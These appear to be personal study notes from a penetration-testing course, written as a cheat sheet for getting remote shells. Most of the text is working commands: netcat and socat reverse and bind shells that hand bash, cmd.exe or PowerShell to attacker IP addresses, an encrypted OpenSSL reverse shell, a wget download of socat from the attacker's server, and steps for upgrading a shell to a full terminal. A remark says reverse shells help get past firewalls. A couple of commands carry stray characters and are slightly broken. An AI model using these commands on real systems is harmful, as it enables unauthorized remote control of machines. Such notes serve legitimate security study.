### reverse shell
 - target initiates an outbound connection to attacker listener
 - `target connects to attacker`
 - more used in practice
 - good for bypassing security measures like firewalls

### bind shell
 - target opens a listening port and attacker connects to it
 - `attacker connects to target`


### revshell setup
 - **attacker:** `nc -lvnp 4444`
 - **target:** `nc 10.113.114.89 4444 -e /bin/bash`

### bind setup
 - **target:** `nc -lvnp 8080 -e /bin/bash`
 - **attacker:** `nc 10.113.143.245 8080`

__________________________________________
# Tools

### `netcat` (nc)
 - swiss army knife of networking tools
 - quick and simple
 
 - listener mode:
 - `nc -lvnp <port>`
 - choose a **port > 1024** to avoid need of root priviliges

 - establishing a reverse shell
 - `nc <target_ip> <port> -e /bin/bash`

 - hosting a bind shell (target opens a listening port)
 - `nc -lvnp <port> -e /bin/bash`

 - connecting to a bind shell
 - `nc <target_ip> <port>`

### `ncat` (from nmap)
 - more **advanced** than netcat
 - supports SSL, proxy, IPv6, ...

### `rlwrap` (readline wrapper)
 - wraps around netcat
 - command history + tab completion
 - eg. `rlwrap nc -lvnp 4444`

### `socat`
 - more advanced than netcat
 - PTY ("normal" shell), encrypt traffic, ...
 
#### socat revshell:
 - listener (attacker)
  - `socat TCP-L:443 -`
 - target
  - `socat TCP:10.113.114.89:443 EXEC:"bash -li"`

#### socat bind shell:
 - target
  - `socat TCP-L:8088 EXEC:"bash -li"`
  - *on windows*, use this: `socat TCP-L:8088 EXEC:cmd.exe,pipes`
 - attacker
  - `socat TCP:10.113.143.245:8088 -`


### Msfvenom and Metasploit's multi/handler
 - msfvenom: generate payloads
 - `multi/handler`: listen for incoming connections from payloads

__________________________________________
# spawning TTY with Python
 - to get shell stablization

get **3 terminals** to be comfortable
(1 for attacker, 2 for target)

attacker:
 - get terminal dimensions: `stty size`
 - start listener: `nc -lvnp 4444`

target:
 - start reverse shell: `nc <attacker_ip> 4444 -e /bin/bash`
 
attacker:
 - spawn a bash process with python: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
target:
- finish the shell upgrade: `export TERM=xterm`

attacker:
**ctrl + z**
`stty raw -echo`
`fg`

#### that's it, not perfect, but better than raw

__________________________________________
# Upgrading to a Fully Interactive Shell with Socat

attacker:
- serve socat to target: `sudo python3 -m http.server 80`

target:
 - get it from attacker: `wget http://<attacker_ip>/socat -O /tmp/socat`
 - give exec priviliges: `chmod +x /tmp/socat`

attacker:
 - idk: ```socat TCP-L:5555 FILE:`tty`,raw,echo=0**```

target:
```
/tmp/socat TCP:<attacker_ip>:5555 \ EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
__________________________________________
# encrypted reverse shell with socat

attacker:
```
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

target:
```
socat OPENSSL:<attacker_ip>:443,verify=0 EXEC:/bin/bash

### on windows, target would do this instead:
socat OPENSSL:10.113.114.89:443,verify=0 EXEC:powershell.exe,pipes
```
__________________________________________
## encrypted TTY shells
 - **attacker:** *encrypted listener with TTY support*
 - **target:** *connect with full TTY options while using SSL encryption*

attacker:  
```socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0```

target:  
```socat OPENSSL:10.113.114.89:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane```